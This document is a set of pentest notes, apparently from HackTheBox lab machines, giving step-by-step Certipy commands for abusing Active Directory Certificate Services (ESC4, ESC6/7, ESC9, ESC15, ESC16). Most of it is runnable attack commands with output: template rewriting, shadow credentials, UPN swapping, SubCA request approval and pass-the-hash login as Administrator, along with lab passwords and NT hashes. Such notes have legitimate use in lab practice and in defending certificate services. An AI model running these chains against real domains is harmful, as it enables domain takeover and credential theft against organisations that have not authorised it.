# Creating Certificates from Certsrv.

To create a certificate first we’ll need to create a CSR (Certificate Signing Request). We can use openssl to do the job.

```bash
openssl genrsa -des3 -out amanda.key 2048 ​# create private key
openssl req -new -key amanda.key -out amanda.csr ​# create csr
```

Enter a passphrase when prompted and the same while creating the CSR. Press enter through all
the prompts.

Sign in to /certsrv -> Request a certificate -> advanced certificate request

Enter the content of the csr file in certificate request and leave the rest as it's.

# Enumerate ADCS configurations with Certipy

```bash
certipy find -u 'judith.mader@certified.htb' -p judith09 -dc-ip 10.10.11.41 -vulnerable -enabled
```

More..
https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/

# Exploiting ESC4

Convert it to ESC1, if we have GenericAll

```bash
$ certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration -no-save

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'
```

```bash
certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
```

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
```

# Exploiting ESC9

more.. https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#no-security-extension-esc9

From UNIX-like systems, Certipy (Python) can be used to enumerate for, and conduct, the ESC9 scenario.

In this scenario, user1 has `GenericWrite` against user2 and wants to compromise user3. user2 is allowed to enroll in a vulnerable template that specifies the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value.

First, the user2's hash is needed. It can be retrieved via a Shadow Credentials attack, for example.

```bash
certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
```

Then, the userPrincipalName of user2 is changed to user3.

```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
```

The vulnerable certificate can be requested as user2.

```bash
certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
```

The user2's UPN is changed back to something else.

```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
```

Now, authenticating with the obtained certificate will provide the user3's NT hash during UnPac the hash. The domain must be specified since it is not present in the certificate.

```bash
certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"
```

## ESC7

Has three exploits

#### Exposing to ESC6:

If sufficient rights are obtained over the Certificate Authority (ManageCA?, local admin account, ...) an attacker could remotely edit the registries, enable the EDITF_ATTRIBUTESUBJECTALTNAME2 attribute, restart the CertSvc service, and abuse ESC6

```bash
# /!\ Beware: change placeholder values CA-NAME, VALUE, NEW_VALUE

# query flags
reg.py "$DOMAIN"/"$USER":"$PASSWORD"@$"ADCS_IP" query -keyName "HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy" -v editflags

# bitwise OR to set the flag if not already (nothing changed if already set)
python3 -c print("NEW_VALUE:", VALUE | 0x40000)

# write flags
reg.py "$DOMAIN"/"$USER":"$PASSWORD"@$"ADCS_IP" add -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags -vd NEW_VALUE
```

#### Exploit Scenario B

Instead of giving the resulting certificate the ability to authenticate, I’ll give it the agent property:

```bash
certipy req -u cert_admin -p '0xdf0xdf!' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Certificate Request Agent'
```

I can basically complete the ESC3 attack (like in Certificate). I’ll use that PFX to request a ticket as Administrator for a template that is meant for user login:

```bash
certipy req -u cert_admin -p '0xdf0xdf!' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
```

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
```

#### Add Manage Ceritificates

First, I’ll need to use the Manage CA permission to give user the Manage Certificates permission:

```bash
certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

Now user shows up there where they didn’t before:

```bash
certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout

...[snip]...
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
...[snip]...
```

exploiting SubCA

```bash
certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 13
Would you like to save the private key? (y/N) y
[*] Saved private key to 13.key
[-] Failed to request certificate
```

```bash
certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

```bash
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

```bash
certipy auth -pfx administrator.pfx -dc-ip manager.htb
[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

## ESC15

```bash
certipy req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target-ip 10.10.11.72 -u cert_admin -p password@123 -template WebServer -upn Administrator@tombwatcher.htb -application-policies 'Client Authentication'
```

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -username administrator -ldap-scheme ldap
```

## ESC16

Prerequisites:

- A CA configured to disable the SID extension.
- An **attacker-controlled account with permission to enroll any client-auth** certificate.
- Domain controllers not enforcing full certificate binding (mode 0 or 1).

Step(1): Updating the UPN (User Principal Name)

```bash
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
```

```bash
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
```

Now we are updating the UPN of the **ca_svc** user to grant administrator privileges. It’s time to request the certificate.

```bash
certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
```

Now we have the administrative certificate, but we still can’t authenticate with it. Like ESC9, we have to update the UPN again to ca_svc, and now we can authenticate as an administrator. Make sure to follow the same sequence.

```bash
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update
```

It’s time to authenticate as an administrator now using Certipy.

```bash
certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -u administrator -domain fluffy.htb

evil-winrm -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```
